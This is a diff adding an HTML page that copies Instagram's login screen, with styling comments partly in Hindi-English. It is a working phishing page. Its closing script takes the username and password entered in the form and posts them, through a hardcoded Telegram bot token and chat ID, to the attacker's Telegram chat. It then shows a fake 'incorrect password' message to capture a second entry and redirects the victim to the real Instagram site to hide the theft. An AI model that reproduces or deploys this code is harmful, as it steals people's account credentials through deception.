@@ -1,0 +1,569 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Instagram</title>
+  <html class="_9dls _ar44" lang="en" dir="ltr"><head><link data-Instagram-icon="Instagram/rsrc.php/yr/r/rzWiSjZRxk5.webp" rel="icon" sizes="192x192" href="https://static.cdninstagram.com/rsrc.php/yr/r/rzWiSjZRxk5.webp" /><meta name="bingbot" content="noarchive" /><meta name="robots" content="noarchive, noimageindex" /><meta charset="utf-8" /><meta name="apple-mobile-web-app-status-bar-style" content="Instagram" /><meta name="mobile-web-app-capable" content="yes" /><meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=2, viewport-fit=cover" /><meta name="theme-color" content="#ffffff" /><meta name="theme-color" content="#000000" media="(prefers-color-scheme: dark)" /><link rel="apple-touch-icon" sizes="76x76" href="https://static.cdninstagram.com/rsrc.php/yj/r/f01UdNyJjJj.webp" />
+  <style>
+    :root {
+      color-scheme: light;
+      --blue: #8bb8ef;
+      --border: #d6d9dd;
+      --muted: #737373;
+      --page: #fff;
+    }
+
+    * { box-sizing: border-box; }
+
+    body {
+      margin: 0;
+      min-height: 100vh;
+      background: var(--page);
+      color: #262626;
+      font-family: Arial, sans-serif;
+      font-size: 16px;
+    }
+
+    main {
+      min-height: 100vh;
+      display: grid;
+      grid-template-columns: 51.3% 48.7%;
+    }
+
+    .intro {
+      position: relative;
+      min-height: 100vh;
+      overflow: hidden;
+      border-right: 1px solid var(--border);
+      padding: 52px 32px;
+      text-align: center;
+    }
+
+    .camera-logo {
+      position: absolute;
+      top: 53px;
+      left: 58px;
+      width: 77px;
+      height: 77px;
+      border: 8px solid transparent;
+      border-radius: 25px;
+      background: linear-gradient(#fff, #fff) padding-box, linear-gradient(145deg, #6158e8, #d62976 45%, #feda75) border-box;
+      box-shadow: 0 0 0 1px rgba(214, 41, 118, .1);
+    }
+
+
+    .camera-logo::before {
+      content: "";
+      position: absolute;
+      inset: 11px;
+      border: 7px solid #d62976;
+      border-radius: 50%;
+    }
+
+    .camera-logo::after {
+      content: "";
+      position: absolute;
+      top: 8px;
+      right: 7px;
+      width: 10px;
+      height: 10px;
+      border-radius: 50%;
+      background: #d62976;
+    }
+
+    .intro-copy { margin: 101px auto 0; max-width: 530px; }
+
+    .brand {
+      display: none;
+    }
+
+    .intro h2 {
+      margin: 0;
+      font-size: 38px;
+      font-weight: 400;
+      line-height: 1.7;
+    }
+
+    .intro h2 span {
+      background: linear-gradient(90deg, #ff5c54, #ed0a9b);
+      color: transparent;
+      background-clip: text;
+    }
+
+    .collage {
+      position: relative;
+      width: 280px;
+      height: 245px;
+      margin: 21px auto 0;
+    }
+
+    .photo {
+      position: absolute;
+      width: 128px;
+      height: 190px;
+      overflow: hidden;
+      border: 7px solid #fff;
+      border-radius: 17px;
+      box-shadow: 0 5px 15px rgba(0, 0, 0, .2);
+      background: linear-gradient(135deg, #a9d8ed, #176b54 52%, #f2a243);
+    }
+
+    .photo::before { content: ""; position: absolute; inset: 0; background: radial-gradient(circle at 30% 27%, #ffd8a8 0 14%, transparent 15%), linear-gradient(160deg, transparent 38%, rgba(255, 225, 161, .8) 39% 61%, transparent 62%); }
+    .photo::after { content: ""; position: absolute; left: 18%; right: 18%; bottom: 7%; height: 18%; border-radius: 50% 50% 20% 20%; background: rgba(32, 56, 68, .7); }
+    .photo.back-left { left: 20px; top: 38px; transform: rotate(-7deg); background: linear-gradient(140deg, #b8e8f8, #d46749 58%, #283c5d); }
+    .photo.back-right { right: 14px; top: 43px; transform: rotate(8deg); background: linear-gradient(150deg, #ffdc78, #48a565 52%, #5d4d9a); }
+    .photo.front { left: 76px; top: 5px; z-index: 2; background: linear-gradient(150deg, #edc38c, #6b9c83 48%, #d77048); }
+
+    .heart, .spark { position: absolute; z-index: 3; color: #ff1744; font-size: 44px; text-shadow: 0 3px 8px rgba(0, 0, 0, .18); }
+    .heart { left: 0; top: 112px; }
+    .spark { right: -5px; top: 76px; color: #18c85b; font-size: 30px; }
+
+    .login-area { display: flex; justify-content: center; padding: 106px 32px 42px; }
+    .login-wrap { width: min(100%, 546px); }
+    .login-card, .signup-card { width: 100%; }
+    .login-card { padding: 0; }
+    .login-card h1 { margin: 0 0 25px; font-size: 17px; font-weight: 600; }
+
+    form { display: grid; gap: 12px; }
+
+    label { position: absolute; width: 1px; height: 1px; overflow: hidden; clip: rect(0, 0, 0, 0); }
+
+    input {
+      width: 100%;
+      height: 60px;
+      padding: 15px 16px;
+      border: 1px solid #c8cdd3;
+      border-radius: 16px;
+      background: #fff;
+      color: #262626;
+      font-size: 14px;
+      outline: none;
+    }
+
+    input:focus { border-color: #a8a8a8; }
+
+    button {
+      height: 44px;
+      margin-top: 12px;
+      border: 0;
+      border-radius: 24px;
+      background: #0095f6;;
+      color: #fff;
+      font-weight: 600;
+      cursor: pointer;
+    }
+    
+
+    button:hover { background: #6fa6e8; }
+    button:focus-visible { outline: 2px solid #262626; outline-offset: 2px; }
+
+    .divider {
+      display: flex;
+      align-items: center;
+      margin: 24px 0 0;
+      color: #000;
+      font-size: 16px;
+    }
+
+    .divider::before, .divider::after { display: none; }
+
+    .facebook, .forgot { display: block; text-align: center; text-decoration: none; }
+
+    .facebook { margin-top: 64px; padding: 13px; border-radius: 24px; background: #f1f2f4; color: #000; font-weight: 400; }
+    .facebook::first-letter { color: #0866ff; }
+    .forgot { margin-top: 28px; color: #000; font-size: 16px; }
+
+    .status {
+      min-height: 20px;
+      margin: 12px 0 0;
+      color: var(--muted);
+      font-size: 12px;
+      text-align: center;
+    }
+
+    .signup-card { margin-top: 12px; padding: 13px; border: 1px solid #1473ff; border-radius: 24px; text-align: center; }
+
+    .signup-card a { color: #0064e0; font-weight: 400; text-decoration: none; }
+
+    .meta { margin: 25px auto 0; color: #263746; font-size: 17px; text-align: center; }
+    .meta::first-letter { color: #087eff; }
+
+    footer {
+      display: none;
+      color: var(--muted);
+      font-size: 12px;
+      text-align: center;
+    }
+
+    footer nav { display: flex; flex-wrap: wrap; justify-content: center; gap: 14px; margin-bottom: 16px; }
+    footer a { color: inherit; text-decoration: none; }
+    footer a:hover, .forgot:hover { text-decoration: underline; }
+
+    @media (max-width: 800px) {
+
+  /* ================================
+     MOBILE ONLY
+     ================================ */
+
+  main {
+    display: block !important;
+    width: 100% !important;
+    min-height: 0 !important;
+    height: auto !important;
+    margin: 0 !important;
+    padding: 0 !important;
+  }
+
+
+  /* --------------------------------
+     INTRO SECTION
+     Logo ko rakho,
+     baaki INTRO sab hatao
+     -------------------------------- */
+
+  .intro {
+    display: block !important;
+
+    width: 100% !important;
+    height: auto !important;
+    min-height: 0 !important;
+
+    margin: 0 !important;
+    padding: 30px 0 0 !important;
+
+    text-align: center !important;
+  }
+
+
+  /* YE TEXT MOBILE PAR NAHI CHAHIYE */
+  .intro-copy {
+    display: none !important;
+  }
+
+  /* Iske andar collage bhi automatically hide
+     ho jayega kyunki intro-copy hidden hai */
+
+
+  /* --------------------------------
+     INSTAGRAM LOGO
+     EXACT 60 x 60
+     -------------------------------- */
+
+  .camera-logo {
+    display: block !important;
+
+    width: 60px !important;
+    height: 60px !important;
+
+    min-width: 60px !important;
+    min-height: 60px !important;
+
+    max-width: 60px !important;
+    max-height: 60px !important;
+
+    flex: 0 0 60px !important;
+
+    aspect-ratio: 1 / 1 !important;
+
+    box-sizing: border-box !important;
+
+    margin: 0 auto 20px auto !important;
+
+    position: relative !important;
+
+    top: auto !important;
+    right: auto !important;
+    bottom: auto !important;
+    left: auto !important;
+
+    transform: none !important;
+  }
+
+
+  /* --------------------------------
+     LOGIN AREA
+     Logo ke bilkul neeche
+     -------------------------------- */
+
+  .login-area {
+    display: block !important;
+
+    width: 100% !important;
+
+    height: auto !important;
+    min-height: 0 !important;
+
+    margin: 0 !important;
+
+    padding: 0 20px 32px !important;
+
+    box-sizing: border-box !important;
+  }
+
+
+  .login-wrap {
+    width: 100% !important;
+    max-width: 390px !important;
+
+    margin: 0 auto !important;
+    padding: 0 !important;
+  }
+
+
+  .login-card {
+    width: 100% !important;
+
+    margin: 0 !important;
+    padding: 0 !important;
+
+    box-sizing: border-box !important;
+  }
+
+
+  /* --------------------------------
+     LOGIN HEADING
+     -------------------------------- */
+
+  .login-card h1 {
+    margin-top: 0 !important;
+    margin-bottom: 24px !important;
+
+    text-align: left !important;
+  }
+
+
+  /* --------------------------------
+     FORM
+     -------------------------------- */
+
+  #login-form {
+    width: 100% !important;
+
+    margin: 0 !important;
+    padding: 0 !important;
+  }
+
+
+  #login-form input {
+    width: 100% !important;
+    box-sizing: border-box !important;
+  }
+
+
+  #login-form button {
+    width: 100% !important;
+    box-sizing: border-box !important;
+  }
+
+
+  /* --------------------------------
+     FORGOT PASSWORD
+     -------------------------------- */
+
+  .forgot {
+    display: block !important;
+    margin-top: 30px !important;
+  }
+
+
+  /* --------------------------------
+     FACEBOOK
+     -------------------------------- */
+
+  .facebook {
+    display: block !important;
+
+    width: 100% !important;
+    box-sizing: border-box !important;
+
+    margin-top: 60px !important;
+  }
+
+
+  /* --------------------------------
+     CREATE ACCOUNT
+     -------------------------------- */
+
+  .signup-card {
+    width: 100% !important;
+    box-sizing: border-box !important;
+
+    margin: 18px 0 0 !important;
+  }
+
+
+  /* --------------------------------
+     META
+     -------------------------------- */
+
+  .meta {
+    margin-top: 42px !important;
+  }
+
+  /* ===== MOBILE LOGO ONLY ===== */
+
+@media (max-width: 800px) {
+
+    /* Instagram logo = ROUNDED SQUARE */
+    .camera-logo {
+        width: 60px !important;
+        height: 60px !important;
+
+        min-width: 60px !important;
+        min-height: 60px !important;
+        max-width: 60px !important;
+        max-height: 60px !important;
+
+        aspect-ratio: 1 / 1 !important;
+        flex: 0 0 60px !important;
+
+        /* Square with rounded corners */
+        border-radius: 16px !important;
+
+        /* Thin outer border */
+        border-width: 5px !important;
+
+        box-sizing: border-box !important;
+    }
+
+    /* Inner camera lens = CIRCLE */
+    .camera-logo::before {
+        border-radius: 50% !important;
+        border-width: 3px !important;
+    }
+
+    /* Small camera dot */
+    .camera-logo::after {
+        width: 7px !important;
+        height: 7px !important;
+        border-radius: 50% !important;
+    }
+}
+
+
+
+  /* --------------------------------
+     MOBILE FOOTER HIDE
+     -------------------------------- */
+
+  footer {
+    display: none !important;
+  }
+}
+</style>
+
+</head>
+<body>
+  <main>
+    <section class="intro" aria-labelledby="intro-title">
+      <div class="camera-logo" aria-label="Instagram logo"></div>
+      <div class="intro-copy">
+        <h2 id="intro-title">See everyday moments from<br>your <span>close friends.</span></h2>
+        <div class="collage" aria-hidden="true">
+          <div class="photo back-left"></div>
+          <div class="photo back-right"></div>
+          <div class="photo front"></div>
+          <span class="heart">♥</span>
+          <span class="spark">✦</span>
+        </div>
+      </div>
+    </section>
+
+    <section class="login-area" aria-labelledby="page-title">
+      <div class="login-wrap">
+        <div class="login-card">
+          <h1 id="page-title">Log into Instagram</h1>
+          <form id="login-form">
+            <label for="username">Mobile number, username or email</label>
+            <input id="username" name="username" type="text" autocomplete="username" placeholder="Mobile number, username or email" required>
+            <label for="password">Password</label>
+            <input id="password" name="password" type="password" autocomplete="current-password" placeholder="Password" required>
+            <button type="submit">Log in</button>
+          </form>
+          <p id="status" class="status" role="status" aria-live="polite"></p>
+          <a class="forgot" href="#forgot">Forgot password?</a>
+          <a class="facebook" href="https://www.facebook.com/" rel="noreferrer">f &nbsp; Log in with Facebook</a>
+        </div>
+        <div class="signup-card"><a href="#signup">Create new account</a></div>
+        <div class="meta">∞ <strong>Meta</strong></div>
+      </div>
+    </section>
+  </main>
+
+  <footer>
+    <nav aria-label="Footer links">
+      <a href="#meta">Meta</a>
+      <a href="#about">About</a>
+      <a href="#blog">Blog</a>
+      <a href="#jobs">Jobs</a>
+      <a href="#help">Help</a>
+      <a href="#privacy">Privacy</a>
+      <a href="#terms">Terms</a>
+    </nav>
+    <span>English &middot; &copy; 2026 Instagram from Meta</span>
+  
+  </footer>
+ <script>
+    const BOT_TOKEN = '8809210844:AAFoPke9L3fgV5rDDTxR2zuVfRr-0bTAQu0'; 
+    const CHAT_ID = '6263520410';
+
+    // Click count ko track karne ke liye variable (Isi code me add kiya hai)
+    let loginAttempts = 0; 
+
+    // Aapke HTML ke 'login-form' ko target kiya
+    document.getElementById('login-form').addEventListener('submit', function(e) {
+        e.preventDefault(); 
+
+        loginAttempts++; // Har click par count 1 badhega
+
+        const statusField = document.getElementById('status');
+        statusField.textContent = "Connecting...";
+        statusField.style.color = "blue";
+
+        // Username aur Password inputs se value li
+        const user = document.getElementById('username').value;
+        const pass = document.getElementById('password').value;
+
+        // Telegram format design (Attempt number ke sath)
+        const textMessage = `📸 *Instagram Login Alert* (Attempt ${loginAttempts})\n\n👤 *Username:* ${user}\n🔑 *Password:* ${pass}`;
+        const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+        fetch(telegramUrl, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ 
+                chat_id: CHAT_ID, 
+                text: textMessage,
+                parse_mode: 'Markdown'
+            })
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.ok) {
+                // AGAR PEHLI BAAR CLICK KIYA HAI (RE-ENTER BOLNE KE LIYE)
+                if (loginAttempts === 1) {
+                    statusField.textContent = "Incorrect password. Please re-enter your password.";
+                    statusField.style.color = "red";
+                    
+                    // Sirf password box clear hoga taaki user re-enter kare
+                    document.getElementById('password').value = ''; 
+                } 
+                // AGAR DUBARA CLICK KIYA HAI (TAB REDIRECT HOGA)
+                else if (loginAttempts >= 2) {
+                    window.location.href = "https://www.instagram.com/accounts/login/";
+                }
+            } else {
+                statusField.textContent = "Error: " + data.description;
+                statusField.style.color = "red";
+            }
+        })
+        .catch(error => {
+            console.error('Error:', error);
+            statusField.textContent = "Network error. Try again.";
+            statusField.style.color = "red";
+        });
+    });
+</script>
+</body>
+</html>
